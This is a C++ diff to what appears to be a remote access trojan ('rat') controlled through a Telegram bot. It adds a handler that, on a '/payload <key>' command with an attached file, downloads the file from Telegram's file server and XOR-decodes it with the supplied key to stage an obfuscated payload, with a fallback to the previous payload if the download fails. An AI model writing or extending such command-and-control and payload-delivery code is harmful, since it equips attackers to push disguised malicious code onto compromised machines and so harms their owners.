@@ -2,12 +2,13 @@
 #include "rat/encryption/encryption.hpp"
 #include "rat/encryption/xor.hpp"
 #include "rat/handler/debug.hpp"
+#include "rat/networking/helpers.hpp"
 #include "rat/system.hpp"
 
 #include <filesystem>
 #include <fmt/core.h>
 #include <sstream>
-#include <streambuf>
+#include <sys/types.h>
 #include <vector>
 
 namespace rat::handler {
@@ -45,9 +46,56 @@ inline std::vector<std::filesystem ::path> Handler::downloadMultipleFiles(
 	return downloaded_files;
 }
 
+void Handler::handleXoredPayload(::rat::tbot::Message &Tbot_Message) {
+		if(Tbot_Message.caption == std::nullopt ||
+		   !Tbot_Message.caption.value().starts_with("/payload") ||
+		   Tbot_Message.caption.value().size() <= 8 ||
+		   Tbot_Message.files.size() != 1) {
+			return;
+		}
+
+	const std::string &caption = *Tbot_Message.caption;
+
+	// Slice after "/payload"
+	std::string_view key = std::string_view(caption).substr(8);
+	// Trim manually (string_view-safe)
+	auto trim_view = [](std::string_view sv) {
+		size_t start = sv.find_first_not_of(" \t\n\r");
+		size_t end = sv.find_last_not_of(" \t\n\r");
+		if(start == std::string_view::npos)
+			return std::string_view{};
+		return sv.substr(start, end - start + 1);
+	};
+
+	key = trim_view(key);
+
+	// Copy into state (required since caption may not outlive state)
+	this->state.payload_key.assign(key);
+	// this is special code that is really unique to this operation;
+	::rat::networking::XorDataContext xored_data_context = {
+	    &this->state.payload_key, 0, &this->state.payload};
+
+	std::vector<uint8_t> backup_payload = this->state.payload;
+
+	const std::string &file_id = Tbot_Message.files[0].id;
+	const std::string file_url =
+	    fmt::format("{}{}", this->bot->getBotFileUrl(), file_id);
+
+	auto result =
+	    this->bot->curl_client.downloadDataXored(file_url, xored_data_context);
+		if(result.curl_code != CURLE_OK) {
+			this->state.payload = std::move(backup_payload);
+			HANDLER_ERROR_LOG("Failed to downlaod the obfuscated payload");
+			return;
+		}
+
+	HANDLER_DEBUG_LOG("Succeeded at downloading the payload");
+}
+
 inline void Handler::handlePayload(::rat::tbot::Message &Tbot_Message,
                                    const std::filesystem::path &Payload_Path) {
 		if(Tbot_Message.caption.value() != "/payload") {
+			this->handleXoredPayload(Tbot_Message);
 			return;
 		}
 	const std::string &dummy_telegram_message =
